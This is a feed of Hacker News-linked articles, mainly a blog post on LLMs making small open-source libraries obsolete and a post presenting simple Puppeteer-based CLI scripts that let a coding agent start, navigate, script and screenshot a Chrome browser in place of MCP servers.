		<p>DarkPattern.Games is a brand new website. We are starting with iOS and Android games because this is where most dark patterns appear, but we will be adding other platforms soon.</p>
		<p>Because we are new, we have a lot of games that don't have any reviews yet. This will improve over time and we are working hard to get games reviewed. Please help us by <a href="https://www.darkpattern.games/search.php">finding</a> a familiar game and submitting a review.</p>
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The fate of "small" open source (243 pts)]]></title>
            <link>https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</link>
            <guid>45947639</guid>
            <pubDate>Sun, 16 Nov 2025 19:21:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/">https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</a>, See on <a href="https://news.ycombinator.com/item?id=45947639">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p>By far the most popular npm package I’ve ever written is <a href="https://www.npmjs.com/package/blob-util"><code>blob-util</code></a>, which is ~10 years old and still gets 5+ million weekly downloads.</p>
<p>It’s a small collection of utilities for working with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Blob"><code>Blob</code>s</a> in JavaScript. I wrote it because I found that PouchDB users were endlessly confused about how to work with <code>Blob</code>s and how to convert them to strings, <code>ArrayBuffer</code>s, etc.</p>
<p>Given that <a href="https://survey.stackoverflow.co/2025/ai#sentiment-and-usage">some 80% of developers</a> are now using AI in their regular work, <code>blob-util</code> is almost certainly the kind of thing that most developers would just happily have an LLM generate for them. Sure, you <em>could</em> use <code>blob-util</code>, but then you’d be taking on an extra dependency, with unknown performance, maintenance, and supply-chain risks.</p>
<p>And sure enough, Claude will happily spit out whatever <code>Blob</code> utilities you need when prompted:</p>
<p><em>&gt; Write me a utility function in TypeScript to convert a Blob to an ArrayBuffer. It should return a Promise.</em></p>
<pre title="">function blobToArrayBuffer(blob: Blob): Promise&lt;ArrayBuffer&gt; {
  return new Promise((resolve, reject) =&gt; {
    const reader = new FileReader();

    reader.onload = () =&gt; {
      if (reader.result instanceof ArrayBuffer) {
        resolve(reader.result);
      } else {
        reject(new Error('Failed to read Blob as ArrayBuffer'));
      }
    };

    reader.onerror = () =&gt; {
      reject(reader.error);
    };

    reader.readAsArrayBuffer(blob);
  });
}
</pre>
<p>Claude’s version is pretty close to <a href="https://github.com/nolanlawson/blob-util/blob/99c06472d18329eda1421286692bd875d76d5c9c/src/blob-util.ts#L384-L394">the <code>blob-util</code> version</a> (unsurprising, since it was probably trained on it!). Although it’s much more verbose, unnecessarily checking if <code>readAsArrayBuffer</code> actually gives you an <code>ArrayBuffer</code> (although this does make TypeScript happy). To be fair, it also improves on my implementation by directly <code>reject</code>ing with an error rather than the more awkward <code>onerror</code> event.</p>

<p>I suppose some people would see this as progress: fewer dependencies, more robust code (even if it’s a bit more verbose), quicker turnaround time than the old “search npm, find a package, read the docs, install it” approach.</p>
<p>I don’t have any excessive pride in this library, and I don’t particularly care if the download numbers go up or down. But I do think something is lost with the AI approach. When I wrote <code>blob-util</code>, I took a teacher’s mentality: the README has <a href="https://www.npmjs.com/package/blob-util#tutorial">a cutesy and whimsical tutorial</a> featuring Kirby, in all his blobby glory. (I had a thing for putting Nintendo characters in all my stuff at the time.)</p>
<p>The goal wasn’t just to give you a utility to solve your problem (although it does that) – the goal was also to <em>teach</em> people how to use JavaScript effectively, so that you’d have an understanding of how to solve other problems in the future.</p>
<p>I don’t know which direction we’re going in with AI (well, ~80% of us; to the remaining holdouts, I salute you and wish you godspeed!), but I do think it’s a future where we prize instant answers over teaching and understanding. There’s less reason to use something like <code>blob-util</code>, which means there’s less reason to write it in the first place, and therefore less reason to educate people about the problem space.</p>
<p>Even now there’s a movement toward putting documentation in an <a href="https://llmstxt.org/"><code>llms.txt</code></a> file, so you can just point an agent at it and save your brain cells the effort of deciphering English prose. (Is this even documentation anymore? What <em>is</em> documentation?)</p>
<h2>Conclusion</h2>
<p>I still believe in open source, and I’m still doing it (in fits and starts). But one thing has become clear to me: the era of small, low-value libraries like <code>blob-util</code> is over. They were already on their way out thanks to Node.js and the browser taking on more and more of their functionality (see <code>node:glob</code>, <code>structuredClone</code>, etc.), but LLMs are the final nail in the coffin.</p>
<p>This does mean that there’s less opportunity to use these libraries as a springboard for user education (Underscore.js <a href="https://underscorejs.org/docs/underscore-esm.html">also had this philosophy</a>), but maybe that’s okay. If there’s no need to find a library to, say, <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy">group the items in an array</a>, then maybe learning about the mechanics of such libraries is unnecessary. Many software developers will argue that asking a candidate to reverse a binary tree is pointless, since it never comes up in the day-to-day job, so maybe the same can be said for utility libraries.</p>
<p>I’m still trying to figure out what <em>kinds</em> of open source are worth writing in this new era (hint: ones that an LLM can’t just spit out on command), and where education is the most lacking. My current thinking is that the most value is in bigger projects, more inventive projects, or in more niche topics not covered in an LLM’s training data. For example, I look back on my work on <a href="https://github.com/nolanlawson/fuite"><code>fuite</code></a> and various <a href="https://nolanlawson.com/2022/01/05/memory-leaks-the-forgotten-side-of-web-performance/">memory-leak-hunting blog posts</a>, and I’m pretty satisfied that an LLM couldn’t reproduce this, because it requires novel research and creative techniques. (Although who knows: maybe someday an agent will be able to just bang its head against Chrome heap snapshots until it finds the leak. I’ll believe it when I see it.)</p>
<p>There’s been a lot of hand-wringing lately about where open source fits in in a world of LLMs, but I still see people pushing the boundaries. For example, a lot of naysayers think there’s no point in writing a new JavaScript framework, since LLMs are so heavily trained on React, but then there goes the indefatigable <a href="https://github.com/trueadm">Dominic Gannaway</a> writing <a href="https://www.ripplejs.com/">Ripple.js</a>, yet another JavaScript framework (and with <a href="https://podrocket.logrocket.com/ripple-js-dominic-gannaway-logrocket-podrocket">some new ideas</a>, to boot!). This is the kind of thing I like to see: humans laughing in the face of the machine, going on with their human thing.</p>
<p>So if there’s a conclusion to this meandering blog post (excuse my squishy human brain; I didn’t use an LLM to write this), it’s just that: yes, LLMs have made some kinds of open source obsolete, but there’s still plenty of open source left to write. I’m excited to see what kinds of novel and unexpected things you all come up with.</p>
							</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What if you don't need MCP at all? (206 pts)]]></title>
            <link>https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/</link>
            <guid>45947444</guid>
            <pubDate>Sun, 16 Nov 2025 18:58:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/">https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/</a>, See on <a href="https://news.ycombinator.com/item?id=45947444">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>



<p>2025-11-02</p>

<figure>
<img src="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/media/header.png">
<figcaption>One chonky MCP server</figcaption>
</figure>




<div>
<ul><li><a href="#toc_0">My Browser DevTools Use Cases</a></li><li><a href="#toc_1">Problems with Common Browser DevTools for Your Agent</a></li><li><a href="#toc_2">Embracing Bash (and Code)</a><ul><li><a href="#toc_3">The Start Tool</a></li><li><a href="#toc_4">The Navigate Tool</a></li><li><a href="#toc_5">The Evaluate JavaScript Tool</a></li><li><a href="#toc_6">The Screenshot Tool</a></li></ul></li><li><a href="#toc_7">The Benefits</a></li><li><a href="#toc_8">Adding the Pick Tool</a></li><li><a href="#toc_9">Adding the Cookies Tool</a></li><li><a href="#toc_10">A Contrived Example</a></li><li><a href="#toc_11">Making This Reusable Across Agents</a></li><li><a href="#toc_12">In Conclusion</a></li></ul>
</div>

<p>After months of agentic coding frenzy, Twitter is still ablaze with discussions about MCP servers. I previously did some <a href="https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/">very light benchmarking</a> to see if Bash tools or MCP servers are better suited for a specific task. The TL;DR: both can be efficient if you take care.</p>
<p>Unfortunately, many of the most popular MCP servers are inefficient for a specific task. They need to cover all bases, which means they provide large numbers of tools with lengthy descriptions, consuming significant context.</p>
<p>It's also hard to extend an existing MCP server. You could check out the source and modify it, but then you'd have to understand the codebase, together with your agent.</p>
<p>MCP servers also aren't composable. Results returned by an MCP server have to go through the agent's context to be persisted to disk or combined with other results.</p>
<p>I'm a simple boy, so I like simple things. Agents can run Bash and write code well. Bash and code are composable. So what's simpler than having your agent just invoke CLI tools and write code? This is nothing new. We've all been doing this since the beginning. I'd just like to convince you that in many situations, you don't need or even want an MCP server.</p>
<p>Let me illustrate this with a common MCP server use case: browser dev tools.</p>
<h2 id="toc_0">My Browser DevTools Use Cases</h2>
<p>My use cases are working on web frontends together with my agent, or abusing my agent to become a scrapey little hacker boy so I can scrape all the data in the world. For these two use cases, I only need a minimal set of tools:</p>
<ul>
<li>Start the browser, optionally with my default profile so I'm logged in</li>
<li>Navigate to a URL, either in the active tab or a new tab</li>
<li>Execute JavaScript in the active page context</li>
<li>Take a screenshot of the viewport</li>
</ul>
<p>And if my use case requires additional special tooling, I want to quickly have my agent generate that for me and slot it in with the other tools.</p>
<h2 id="toc_1">Problems with Common Browser DevTools for Your Agent</h2>
<p>People will recommend <a href="https://github.com/microsoft/playwright-mcp">Playwright MCP</a> or <a href="https://github.com/ChromeDevTools/chrome-devtools-mcp">Chrome DevTools MCP</a> for the use cases I illustrated above. Both are fine, but they need to cover all the bases. Playwright MCP has 21 tools using 13.7k tokens (6.8% of Claude's context). Chrome DevTools MCP has 26 tools using 18.0k tokens (9.0%). That many tools will confuse your agent, especially when combined with other MCP servers and built-in tools.</p>
<p>Using those tools also means you suffer from the composability issue: any output has to go through your agent's context. You can kind of fix this by using sub-agents, but then you rope in all the issues that sub-agents come with.</p>
<h2 id="toc_2">Embracing Bash (and Code)</h2>
<p>Here's my minimal set of tools, illustrated via the README.md:</p>
<pre><code><span># Browser Tools</span>

Minimal CDP tools for collaborative site exploration.

<span>## Start Chrome</span>

\<span>`\`</span>\`bash
./start.js              # Fresh profile
./start.js --profile    # Copy your profile (cookies, logins)
\<span>`\`</span>\`

Start Chrome on <span>`:9222`</span> with remote debugging.

<span>## Navigate</span>

\<span>`\`</span>\`bash
./nav.js https://example.com
./nav.js https://example.com --new
\<span>`\`</span>\`

Navigate current tab or open new tab.

<span>## Evaluate JavaScript</span>

\<span>`\`</span>\`bash
./eval.js 'document.title'
./eval.js 'document.querySelectorAll("a").length'
\<span>`\`</span>\`

Execute JavaScript in active tab (async context).

<span>## Screenshot</span>

\<span>`\`</span>\`bash
./screenshot.js
\<span>`\`</span>\`

Screenshot current viewport, returns temp file path.
</code></pre><p>This is all I feed to my agent. It's a handful of tools that cover all the bases for my use case. Each tool is a simple Node.js script that uses <a href="https://pptr.dev/">Puppeteer Core</a>. By reading that README, the agent knows the available tools, when to use them, and how to use them via Bash.</p>
<p>When I start a session where the agent needs to interact with a browser, I just tell it to read that file in full and that's all it needs to be effective. Let's walk through their implementations to see how little code this actually is.</p>
<h3 id="toc_3">The Start Tool</h3>
<p>The agent needs to be able to start a new browser session. For scraping tasks, I often want to use my actual Chrome profile so I'm logged in everywhere. This script either rsyncs my Chrome profile to a temporary folder (Chrome doesn't allow debugging on the default profile), or starts fresh:</p>
<pre><code><span>#!/usr/bin/env node</span>

<span>import</span> { spawn, execSync } <span>from</span> <span>"node:child_process"</span>;
<span>import</span> puppeteer <span>from</span> <span>"puppeteer-core"</span>;

<span>const</span> useProfile = process.<span>argv</span>[<span>2</span>] === <span>"--profile"</span>;

<span>if</span> (process.<span>argv</span>[<span>2</span>] &amp;&amp; process.<span>argv</span>[<span>2</span>] !== <span>"--profile"</span>) {
    <span>console</span>.<span>log</span>(<span>"Usage: start.ts [--profile]"</span>);
    <span>console</span>.<span>log</span>(<span>"\nOptions:"</span>);
    <span>console</span>.<span>log</span>(<span>"  --profile  Copy your default Chrome profile (cookies, logins)"</span>);
    <span>console</span>.<span>log</span>(<span>"\nExamples:"</span>);
    <span>console</span>.<span>log</span>(<span>"  start.ts            # Start with fresh profile"</span>);
    <span>console</span>.<span>log</span>(<span>"  start.ts --profile  # Start with your Chrome profile"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>// Kill existing Chrome</span>
<span>try</span> {
    <span>execSync</span>(<span>"killall 'Google Chrome'"</span>, { <span>stdio</span>: <span>"ignore"</span> });
} <span>catch</span> {}

<span>// Wait a bit for processes to fully die</span>
<span>await</span> <span>new</span> <span>Promise</span>(<span>(<span>r</span>) =&gt;</span> <span>setTimeout</span>(r, <span>1000</span>));

<span>// Setup profile directory</span>
<span>execSync</span>(<span>"mkdir -p ~/.cache/scraping"</span>, { <span>stdio</span>: <span>"ignore"</span> });

<span>if</span> (useProfile) {
    <span>// Sync profile with rsync (much faster on subsequent runs)</span>
    <span>execSync</span>(
        <span>'rsync -a --delete "/Users/badlogic/Library/Application Support/Google/Chrome/" ~/.cache/scraping/'</span>,
        { <span>stdio</span>: <span>"pipe"</span> },
    );
}

<span>// Start Chrome in background (detached so Node can exit)</span>
<span>spawn</span>(
    <span>"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"</span>,
    [<span>"--remote-debugging-port=9222"</span>, <span>`--user-data-dir=<span>${process.env[<span>"HOME"</span>]}</span>/.cache/scraping`</span>],
    { <span>detached</span>: <span>true</span>, <span>stdio</span>: <span>"ignore"</span> },
).<span>unref</span>();

<span>// Wait for Chrome to be ready by attempting to connect</span>
<span>let</span> connected = <span>false</span>;
<span>for</span> (<span>let</span> i = <span>0</span>; i &lt; <span>30</span>; i++) {
    <span>try</span> {
        <span>const</span> browser = <span>await</span> puppeteer.<span>connect</span>({
            <span>browserURL</span>: <span>"http://localhost:9222"</span>,
            <span>defaultViewport</span>: <span>null</span>,
        });
        <span>await</span> browser.<span>disconnect</span>();
        connected = <span>true</span>;
        <span>break</span>;
    } <span>catch</span> {
        <span>await</span> <span>new</span> <span>Promise</span>(<span>(<span>r</span>) =&gt;</span> <span>setTimeout</span>(r, <span>500</span>));
    }
}

<span>if</span> (!connected) {
    <span>console</span>.<span>error</span>(<span>"✗ Failed to connect to Chrome"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>console</span>.<span>log</span>(<span>`✓ Chrome started on :9222<span>${useProfile ? <span>" with your profile"</span> : <span>""</span>}</span>`</span>);
</code></pre><p>All the agent needs to know is to use Bash to run the start.js script, either with <code>--profile</code> or without.</p>
<h3 id="toc_4">The Navigate Tool</h3>
<p>Once the browser is running, the agent needs to navigate to URLs, either in a new tab or the active tab. That's exactly what the navigate tool provides:</p>
<pre><code><span>#!/usr/bin/env node</span>

<span>import</span> puppeteer <span>from</span> <span>"puppeteer-core"</span>;

<span>const</span> url = process.<span>argv</span>[<span>2</span>];
<span>const</span> newTab = process.<span>argv</span>[<span>3</span>] === <span>"--new"</span>;

<span>if</span> (!url) {
    <span>console</span>.<span>log</span>(<span>"Usage: nav.js &lt;url&gt; [--new]"</span>);
    <span>console</span>.<span>log</span>(<span>"\nExamples:"</span>);
    <span>console</span>.<span>log</span>(<span>"  nav.js https://example.com       # Navigate current tab"</span>);
    <span>console</span>.<span>log</span>(<span>"  nav.js https://example.com --new # Open in new tab"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>const</span> b = <span>await</span> puppeteer.<span>connect</span>({
    <span>browserURL</span>: <span>"http://localhost:9222"</span>,
    <span>defaultViewport</span>: <span>null</span>,
});

<span>if</span> (newTab) {
    <span>const</span> p = <span>await</span> b.<span>newPage</span>();
    <span>await</span> p.<span>goto</span>(url, { <span>waitUntil</span>: <span>"domcontentloaded"</span> });
    <span>console</span>.<span>log</span>(<span>"✓ Opened:"</span>, url);
} <span>else</span> {
    <span>const</span> p = (<span>await</span> b.<span>pages</span>()).<span>at</span>(-<span>1</span>);
    <span>await</span> p.<span>goto</span>(url, { <span>waitUntil</span>: <span>"domcontentloaded"</span> });
    <span>console</span>.<span>log</span>(<span>"✓ Navigated to:"</span>, url);
}

<span>await</span> b.<span>disconnect</span>();
</code></pre><h3 id="toc_5">The Evaluate JavaScript Tool</h3>
<p>The agent needs to execute JavaScript to read and modify the DOM of the active tab. The JavaScript it writes runs in the page context, so it doesn't have to fuck around with Puppeteer itself. All it needs to know is how to write code using the DOM API, and it sure knows how to do that:</p>
<pre><code><span>#!/usr/bin/env node</span>

<span>import</span> puppeteer <span>from</span> <span>"puppeteer-core"</span>;

<span>const</span> code = process.<span>argv</span>.<span>slice</span>(<span>2</span>).<span>join</span>(<span>" "</span>);
<span>if</span> (!code) {
    <span>console</span>.<span>log</span>(<span>"Usage: eval.js 'code'"</span>);
    <span>console</span>.<span>log</span>(<span>"\nExamples:"</span>);
    <span>console</span>.<span>log</span>(<span>'  eval.js "document.title"'</span>);
    <span>console</span>.<span>log</span>(<span>'  eval.js "document.querySelectorAll(\'a\').length"'</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>const</span> b = <span>await</span> puppeteer.<span>connect</span>({
    <span>browserURL</span>: <span>"http://localhost:9222"</span>,
    <span>defaultViewport</span>: <span>null</span>,
});

<span>const</span> p = (<span>await</span> b.<span>pages</span>()).<span>at</span>(-<span>1</span>);

<span>if</span> (!p) {
    <span>console</span>.<span>error</span>(<span>"✗ No active tab found"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>const</span> result = <span>await</span> p.<span>evaluate</span>(<span>(<span>c</span>) =&gt;</span> {
    <span>const</span> <span>AsyncFunction</span> = (<span>async</span> () =&gt; {}).<span>constructor</span>;
    <span>return</span> <span>new</span> <span>AsyncFunction</span>(<span>`return (<span>${c}</span>)`</span>)();
}, code);

<span>if</span> (<span>Array</span>.<span>isArray</span>(result)) {
    <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; result.<span>length</span>; i++) {
        <span>if</span> (i &gt; <span>0</span>) <span>console</span>.<span>log</span>(<span>""</span>);
        <span>for</span> (<span>const</span> [key, value] <span>of</span> <span>Object</span>.<span>entries</span>(result[i])) {
            <span>console</span>.<span>log</span>(<span>`<span>${key}</span>: <span>${value}</span>`</span>);
        }
    }
} <span>else</span> <span>if</span> (<span>typeof</span> result === <span>"object"</span> &amp;&amp; result !== <span>null</span>) {
    <span>for</span> (<span>const</span> [key, value] <span>of</span> <span>Object</span>.<span>entries</span>(result)) {
        <span>console</span>.<span>log</span>(<span>`<span>${key}</span>: <span>${value}</span>`</span>);
    }
} <span>else</span> {
    <span>console</span>.<span>log</span>(result);
}

<span>await</span> b.<span>disconnect</span>();
</code></pre><h3 id="toc_6">The Screenshot Tool</h3>
<p>Sometimes the agent needs to have a visual impression of a page, so naturally we want a screenshot tool:</p>
<pre><code><span>#!/usr/bin/env node</span>

<span>import</span> { tmpdir } <span>from</span> <span>"node:os"</span>;
<span>import</span> { join } <span>from</span> <span>"node:path"</span>;
<span>import</span> puppeteer <span>from</span> <span>"puppeteer-core"</span>;

<span>const</span> b = <span>await</span> puppeteer.<span>connect</span>({
    <span>browserURL</span>: <span>"http://localhost:9222"</span>,
    <span>defaultViewport</span>: <span>null</span>,
});

<span>const</span> p = (<span>await</span> b.<span>pages</span>()).<span>at</span>(-<span>1</span>);

<span>if</span> (!p) {
    <span>console</span>.<span>error</span>(<span>"✗ No active tab found"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>const</span> timestamp = <span>new</span> <span>Date</span>().<span>toISOString</span>().<span>replace</span>(<span>/[:.]/g</span>, <span>"-"</span>);
<span>const</span> filename = <span>`screenshot-<span>${timestamp}</span>.png`</span>;
<span>const</span> filepath = <span>join</span>(<span>tmpdir</span>(), filename);

<span>await</span> p.<span>screenshot</span>({ <span>path</span>: filepath });

<span>console</span>.<span>log</span>(filepath);

<span>await</span> b.<span>disconnect</span>();
</code></pre><p>This will take a screenshot of the current viewport of the active tab, write it to a .png file in a temporary directory, and output the file path to the agent, which can then turn around and read it in and use its vision capabilities to "see" the image.</p>
<h2 id="toc_7">The Benefits</h2>
<p>So how does this compare to the MCP servers I mentioned above? Well, to start, I can pull in the README whenever I need it and don't pay for it in every session. This is very similar to Anthropic's recently introduced skills capabilities. Except it's even more ad hoc and works with any coding agent. All I need to do is instruct my agent to read the README file.</p>
<p>Side note: many folks including myself have used this kind of setup before Anthropic released their skills system. You can see something similar in my <a href="https://mariozechner.at/posts/2025-06-02-prompts-are-code/">"Prompts are Code" blog post</a> or my little <a href="https://sitegeist.ai/">sitegeist.ai</a>. <a href="https://lucumr.pocoo.org/2025/8/18/code-mcps/">Armin</a> has also touched on the power of Bash and code compared to MCPs previously. Anthropic's skills add progressive disclosure (love it) and they make them available to a non-technical audience across almost all their products (also love it).</p>
<p>Speaking of the README, instead of pulling in 13,000 to 18,000 tokens like the MCP servers mentioned above, this README has a whopping 225 tokens. This efficiency comes from the fact that models know how to write code and use Bash. I'm conserving context space by relying heavily on their existing knowledge.</p>
<p>These simple tools are also composable. Instead of reading the outputs of an invocation into the context, the agent can decide to save them to a file for later processing, either by itself or by code. The agent can also easily chain multiple invocations in a single Bash command.</p>
<p>If I find that the output of a tool is not token efficient, I can just change the output format. Something that's hard or impossible to do depending on what MCP server you use.</p>
<p>And it's ridiculously easy to add a new tool or modify an existing tool for my needs. Let me illustrate.</p>
<h2 id="toc_8">Adding the Pick Tool</h2>
<p>When the agent and I try to come up with a scraping method for a specific site, it's often more efficient if I'm able to point out DOM elements to it directly by just clicking on them. To make this super easy, I can just build a picker. Here's what I add to the README:</p>
<pre><code><span>## Pick Elements</span>

\<span>`\`</span>\`bash
./pick.js "Click the submit button"
\<span>`\`</span>\`

Interactive element picker. Click to select, Cmd/Ctrl+Click for multi-select, Enter to finish.
</code></pre><p>And here's the code:</p>
<pre><code><span>#!/usr/bin/env node</span>

<span>import</span> puppeteer <span>from</span> <span>"puppeteer-core"</span>;

<span>const</span> message = process.<span>argv</span>.<span>slice</span>(<span>2</span>).<span>join</span>(<span>" "</span>);
<span>if</span> (!message) {
    <span>console</span>.<span>log</span>(<span>"Usage: pick.js 'message'"</span>);
    <span>console</span>.<span>log</span>(<span>"\nExample:"</span>);
    <span>console</span>.<span>log</span>(<span>'  pick.js "Click the submit button"'</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>const</span> b = <span>await</span> puppeteer.<span>connect</span>({
    <span>browserURL</span>: <span>"http://localhost:9222"</span>,
    <span>defaultViewport</span>: <span>null</span>,
});

<span>const</span> p = (<span>await</span> b.<span>pages</span>()).<span>at</span>(-<span>1</span>);

<span>if</span> (!p) {
    <span>console</span>.<span>error</span>(<span>"✗ No active tab found"</span>);
    process.<span>exit</span>(<span>1</span>);
}

<span>// Inject pick() helper into current page</span>
<span>await</span> p.<span>evaluate</span>(<span>() =&gt;</span> {
    <span>if</span> (!<span>window</span>.<span>pick</span>) {
        <span>window</span>.<span>pick</span> = <span>async</span> (message) =&gt; {
            <span>if</span> (!message) {
                <span>throw</span> <span>new</span> <span>Error</span>(<span>"pick() requires a message parameter"</span>);
            }
            <span>return</span> <span>new</span> <span>Promise</span>(<span>(<span>resolve</span>) =&gt;</span> {
                <span>const</span> selections = [];
                <span>const</span> selectedElements = <span>new</span> <span>Set</span>();

                <span>const</span> overlay = <span>document</span>.<span>createElement</span>(<span>"div"</span>);
                overlay.<span>style</span>.<span>cssText</span> =
                    <span>"position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;pointer-events:none"</span>;

                <span>const</span> highlight = <span>document</span>.<span>createElement</span>(<span>"div"</span>);
                highlight.<span>style</span>.<span>cssText</span> =
                    <span>"position:absolute;border:2px solid #3b82f6;background:rgba(59,130,246,0.1);transition:all 0.1s"</span>;
                overlay.<span>appendChild</span>(highlight);

                <span>const</span> banner = <span>document</span>.<span>createElement</span>(<span>"div"</span>);
                banner.<span>style</span>.<span>cssText</span> =
                    <span>"position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1f2937;color:white;padding:12px 24px;border-radius:8px;font:14px sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);pointer-events:auto;z-index:2147483647"</span>;

                <span>const</span> <span>updateBanner</span> = (<span></span>) =&gt; {
                    banner.<span>textContent</span> = <span>`<span>${message}</span> (<span>${selections.length}</span> selected, Cmd/Ctrl+click to add, Enter to finish, ESC to cancel)`</span>;
                };
                <span>updateBanner</span>();

                <span>document</span>.<span>body</span>.<span>append</span>(banner, overlay);

                <span>const</span> <span>cleanup</span> = (<span></span>) =&gt; {
                    <span>document</span>.<span>removeEventListener</span>(<span>"mousemove"</span>, onMove, <span>true</span>);
                    <span>document</span>.<span>removeEventListener</span>(<span>"click"</span>, onClick, <span>true</span>);
                    <span>document</span>.<span>removeEventListener</span>(<span>"keydown"</span>, onKey, <span>true</span>);
                    overlay.<span>remove</span>();
                    banner.<span>remove</span>();
                    selectedElements.<span>forEach</span>(<span>(<span>el</span>) =&gt;</span> {
                        el.<span>style</span>.<span>outline</span> = <span>""</span>;
                    });
                };

                <span>const</span> <span>onMove</span> = (<span>e</span>) =&gt; {
                    <span>const</span> el = <span>document</span>.<span>elementFromPoint</span>(e.<span>clientX</span>, e.<span>clientY</span>);
                    <span>if</span> (!el || overlay.<span>contains</span>(el) || banner.<span>contains</span>(el)) <span>return</span>;
                    <span>const</span> r = el.<span>getBoundingClientRect</span>();
                    highlight.<span>style</span>.<span>cssText</span> = <span>`position:absolute;border:2px solid #3b82f6;background:rgba(59,130,246,0.1);top:<span>${r.top}</span>px;left:<span>${r.left}</span>px;width:<span>${r.width}</span>px;height:<span>${r.height}</span>px`</span>;
                };

                <span>const</span> <span>buildElementInfo</span> = (<span>el</span>) =&gt; {
                    <span>const</span> parents = [];
                    <span>let</span> current = el.<span>parentElement</span>;
                    <span>while</span> (current &amp;&amp; current !== <span>document</span>.<span>body</span>) {
                        <span>const</span> parentInfo = current.<span>tagName</span>.<span>toLowerCase</span>();
                        <span>const</span> id = current.<span>id</span> ? <span>`#<span>${current.id}</span>`</span> : <span>""</span>;
                        <span>const</span> cls = current.<span>className</span>
                            ? <span>`.<span>${current.className.trim().split(/\s+/).join(<span>"."</span>)}</span>`</span>
                            : <span>""</span>;
                        parents.<span>push</span>(parentInfo + id + cls);
                        current = current.<span>parentElement</span>;
                    }

                    <span>return</span> {
                        <span>tag</span>: el.<span>tagName</span>.<span>toLowerCase</span>(),
                        <span>id</span>: el.<span>id</span> || <span>null</span>,
                        <span>class</span>: el.<span>className</span> || <span>null</span>,
                        <span>text</span>: el.<span>textContent</span>?.<span>trim</span>().<span>slice</span>(<span>0</span>, <span>200</span>) || <span>null</span>,
                        <span>html</span>: el.<span>outerHTML</span>.<span>slice</span>(<span>0</span>, <span>500</span>),
                        <span>parents</span>: parents.<span>join</span>(<span>" &gt; "</span>),
                    };
                };

                <span>const</span> <span>onClick</span> = (<span>e</span>) =&gt; {
                    <span>if</span> (banner.<span>contains</span>(e.<span>target</span>)) <span>return</span>;
                    e.<span>preventDefault</span>();
                    e.<span>stopPropagation</span>();
                    <span>const</span> el = <span>document</span>.<span>elementFromPoint</span>(e.<span>clientX</span>, e.<span>clientY</span>);
                    <span>if</span> (!el || overlay.<span>contains</span>(el) || banner.<span>contains</span>(el)) <span>return</span>;

                    <span>if</span> (e.<span>metaKey</span> || e.<span>ctrlKey</span>) {
                        <span>if</span> (!selectedElements.<span>has</span>(el)) {
                            selectedElements.<span>add</span>(el);
                            el.<span>style</span>.<span>outline</span> = <span>"3px solid #10b981"</span>;
                            selections.<span>push</span>(<span>buildElementInfo</span>(el));
                            <span>updateBanner</span>();
                        }
                    } <span>else</span> {
                        <span>cleanup</span>();
                        <span>const</span> info = <span>buildElementInfo</span>(el);
                        <span>resolve</span>(selections.<span>length</span> &gt; <span>0</span> ? selections : info);
                    }
                };

                <span>const</span> <span>onKey</span> = (<span>e</span>) =&gt; {
                    <span>if</span> (e.<span>key</span> === <span>"Escape"</span>) {
                        e.<span>preventDefault</span>();
                        <span>cleanup</span>();
                        <span>resolve</span>(<span>null</span>);
                    } <span>else</span> <span>if</span> (e.<span>key</span> === <span>"Enter"</span> &amp;&amp; selections.<span>length</span> &gt; <span>0</span>) {
                        e.<span>preventDefault</span>();
                        <span>cleanup</span>();
                        <span>resolve</span>(selections);
                    }
                };

                <span>document</span>.<span>addEventListener</span>(<span>"mousemove"</span>, onMove, <span>true</span>);
                <span>document</span>.<span>addEventListener</span>(<span>"click"</span>, onClick, <span>true</span>);
                <span>document</span>.<span>addEventListener</span>(<span>"keydown"</span>, onKey, <span>true</span>);
            });
        };
    }
});

<span>const</span> result = <span>await</span> p.<span>evaluate</span>(<span>(<span>msg</span>) =&gt;</span> <span>window</span>.<span>pick</span>(msg), message);

<span>if</span> (<span>Array</span>.<span>isArray</span>(result)) {
    <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; result.<span>length</span>; i++) {
        <span>if</span> (i &gt; <span>0</span>) <span>console</span>.<span>log</span>(<span>""</span>);
        <span>for</span> (<span>const</span> [key, value] <span>of</span> <span>Object</span>.<span>entries</span>(result[i])) {
            <span>console</span>.<span>log</span>(<span>`<span>${key}</span>: <span>${value}</span>`</span>);
        }
    }
} <span>else</span> <span>if</span> (<span>typeof</span> result === <span>"object"</span> &amp;&amp; result !== <span>null</span>) {
    <span>for</span> (<span>const</span> [key, value] <span>of</span> <span>Object</span>.<span>entries</span>(result)) {
        <span>console</span>.<span>log</span>(<span>`<span>${key}</span>: <span>${value}</span>`</span>);
    }
} <span>else</span> {
    <span>console</span>.<span>log</span>(result);
}

<span>await</span> b.<span>disconnect</span>();
</code></pre><p>Whenever I think it's faster for me to just click on a bunch of DOM elements instead of having the agent figure out the DOM structure, I can just tell it to use the pick tool. It's super efficient and allows me to build scrapers in no time. It's also fantastic to adjust the scraper if the DOM layout of a site changed.</p>
